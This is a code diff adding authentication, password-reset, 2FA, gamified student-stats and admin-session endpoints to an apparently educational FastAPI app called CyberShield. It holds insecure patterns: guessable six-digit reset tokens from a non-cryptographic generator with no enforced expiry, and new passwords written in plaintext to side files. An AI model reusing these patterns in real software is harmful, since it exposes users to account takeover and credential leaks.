+@app.post("/api/verify-otp")
+async def verify_otp_api(req: VerifyOTPRequest):
+    username_clean = req.username.strip().lower()
+    
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT verification_code, is_verified FROM users WHERE username = ?", (username_clean,))
+    row = cursor.fetchone()
+    
+    if not row:
+        conn.close()
+        raise HTTPException(status_code=404, detail="User not found.")
+        
+    code_stored, verified = row
+    if verified:
+        conn.close()
+        return {"status": "success", "message": "Already verified."}
+        
+    if code_stored == req.code:
+        cursor.execute("UPDATE users SET is_verified = 1 WHERE username = ?", (username_clean,))
+        conn.commit()
+        conn.close()
+        return {"status": "success", "message": "Account activated successfully."}
+        
+    conn.close()
+    raise HTTPException(status_code=400, detail="Invalid OTP code.")
+
+@app.post("/api/forgot-password")
+async def forgot_password_api(req: ForgotPasswordRequest):
+    email_clean = req.email.strip().lower()
+    token = str(random.randint(100000, 999999))
+    
+    # We send this code via mock email and save to DB
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET reset_token = ? WHERE email = ?", (token, email_clean))
+    conn.commit()
+    conn.close()
+    
+    subject = "[CyberShield] Password Reset Request"
+    body = f"Your secure password verification code is: {token}. Valid for 10 minutes."
+    dispatch_email_async(subject, body)
+    
+    return {"status": "success", "message": "Verification code dispatched."}
+
+@app.post("/api/reset-password")
+async def reset_password_api(req: ResetPasswordRequest):
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT username FROM users WHERE reset_token = ?", (req.token,))
+    row = cursor.fetchone()
+    
+    if not row:
+        conn.close()
+        raise HTTPException(status_code=400, detail="Invalid or expired reset token.")
+        
+    username = row[0]
+    p_hash = hash_password(req.new_password)
+    cursor.execute("UPDATE users SET password_hash = ?, reset_token = NULL WHERE username = ?", (p_hash, username))
+    
+    # Update student_db/faculty_db accordingly for retro-compatibility
+    if username in student_db:
+        student_db[username] = req.new_password
+        save_db(STUDENTS_FILE, student_db)
+    elif username in faculty_db:
+        faculty_db[username] = req.new_password
+        save_db(FACULTY_FILE, faculty_db)
+        
+    conn.commit()
+    conn.close()
+    return {"status": "success", "message": "Password reset completed."}
+
+@app.post("/api/2fa/enable")
+async def enable_2fa_api(req: Enable2FARequest, request: Request):
+    user = get_user_from_session(request)
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET two_factor_secret = ?, two_factor_enabled = 1 WHERE username = ?", (req.secret, user["username"]))
+    conn.commit()
+    conn.close()
+    return {"status": "success"}
+
+
+@app.get("/api/student/stats")
+async def get_student_stats_api(request: Request):
+    user = get_user_from_session(request)
+    if user["role"] != "student":
+        raise HTTPException(status_code=403, detail="Access denied.")
+    
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+    cursor.execute("SELECT xp, coins, level, completed_tasks FROM student_stats WHERE username = ?", (user["username"],))
+    row = cursor.fetchone()
+    conn.close()
+    
+    if not row:
+        return {"xp": 0, "coins": 0, "level": 1, "completed_tasks": ""}
+    return dict(row)
+
+@app.post("/api/student/stats/update")
+async def update_student_stats_api(req: UpdateStatsRequest, request: Request):
+    user = get_user_from_session(request)
+    if user["role"] != "student":
+        raise HTTPException(status_code=403, detail="Access denied.")
+    
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    
+    # Get current stats
+    cursor.execute("SELECT xp, coins, completed_tasks FROM student_stats WHERE username = ?", (user["username"],))
+    row = cursor.fetchone()
+    if not row:
+        xp, coins, completed = 0, 0, ""
+    else:
+        xp, coins, completed = row
+        
+    task_list = completed.split(',') if completed else []
+    if req.task_id not in task_list:
+        task_list.append(req.task_id)
+        xp += 100
+        coins += 20
+        new_level = (xp // 1000) + 1
+        new_completed = ','.join(task_list)
+        
+        cursor.execute("""
+            INSERT OR REPLACE INTO student_stats (username, xp, coins, level, completed_tasks)
+            VALUES (?, ?, ?, ?, ?)
+        """, (user["username"], xp, coins, new_level, new_completed))
+        
+        # Log the completed task
+        cursor.execute("""
+            INSERT INTO activity_logs (username, role, action, ip_address, device, timestamp)
+            VALUES (?, ?, ?, ?, ?, ?)
+        """, (user["username"], user["role"], f"Completed task: {req.task_name} (+100 XP)", request.client.host, "N/A", datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+        
+        conn.commit()
+    conn.close()
+    return {"status": "updated"}
+
+@app.get("/api/faculty/students")
+async def get_faculty_students_api(request: Request):
+    user = get_user_from_session(request)
+    if user["role"] not in ["faculty", "admin", "student"]:
+        raise HTTPException(status_code=403, detail="Access denied.")
+        
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+    
+    # Row-Level Security: Students only get public leaderboard lists (no raw private detail access)
+    if user["role"] == "student":
+        cursor.execute("SELECT username, xp, level FROM student_stats ORDER BY xp DESC")
+    else:
+        cursor.execute("SELECT username, xp, coins, level, completed_tasks FROM student_stats ORDER BY xp DESC")
+        
+    rows = cursor.fetchall()
+    conn.close()
+    return [dict(r) for r in rows]
+
+@app.get("/api/admin/sessions")
+async def get_admin_sessions_api(request: Request):
+    user = get_user_from_session(request)
+    if user["role"] != "admin":
+        raise HTTPException(status_code=403, detail="Access denied.")
+        
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+    cursor.execute("SELECT session_id, username, role, ip_address, os, browser, created_at FROM sessions WHERE active = 1")
+    rows = cursor.fetchall()
+    conn.close()
+    return [dict(r) for r in rows]
+
+@app.post("/api/admin/sessions/kick")
+async def kick_session_api(req: KickSessionRequest, request: Request):
+    user = get_user_from_session(request)
+    if user["role"] != "admin":
+        raise HTTPException(status_code=403, detail="Access denied.")
+        
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("UPDATE sessions SET active = 0 WHERE session_id = ?", (req.session_id,))
+    
+    # Log the session termination
+    cursor.execute("""
+        INSERT INTO activity_logs (username, role, action, ip_address, device, timestamp)
+        VALUES (?, ?, ?, ?, ?, ?)
+    """, (user["username"], user["role"], f"Terminated session ID: {req.session_id}", request.client.host, "N/A", datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+    
+    conn.commit()
+    conn.close()
+    return {"status": "kicked"}
+
+@app.get("/api/admin/logs")
+async def get_admin_logs_api(request: Request):
+    user = get_user_from_session(request)
+    if user["role"] != "admin":
+        raise HTTPException(status_code=403, detail="Access denied.")
+        
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+    cursor.execute("SELECT username, role, action, ip_address, device, timestamp FROM activity_logs ORDER BY id DESC LIMIT 200")
+    rows = cursor.fetchall()
+    conn.close()
+    return [dict(r) for r in rows]
+
+@app.post("/api/logout")
+async def logout_api(request: Request):
+    user = get_user_from_session(request)
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("UPDATE sessions SET active = 0 WHERE session_id = ?", (user["session_id"],))
+    conn.commit()
+    conn.close()
+    return {"status": "success"}
+
 
 @app.get("/", response_class=HTMLResponse)
 async def get_index():
